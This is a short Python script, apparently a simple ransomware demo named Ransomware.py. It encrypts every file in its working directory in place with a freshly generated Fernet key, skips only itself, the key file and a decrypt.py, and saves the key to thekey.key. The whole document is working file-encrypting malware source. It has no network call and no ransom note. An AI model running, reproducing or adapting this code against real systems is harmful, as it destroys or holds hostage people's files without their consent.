import os
from cryptography.fernet import Fernet

files = []

for file in os.listdir():
    if file == "Ransomware.py" or file == "thekey.key" or file == "decrypt.py":
        continue 

    if os.path.isfile(file):
        files.append(file)

key = Fernet.generate_key()

with open("thekey.key","wb") as arquivo:
    arquivo.write(key)

for file in files:
    with open(file,"rb") as arquivo_2:
        content = arquivo_2.read()
    content_encrypt = Fernet(key).encrypt(content)

    with open(file,"wb") as arquivo_2:
            arquivo_2.write(content_encrypt)
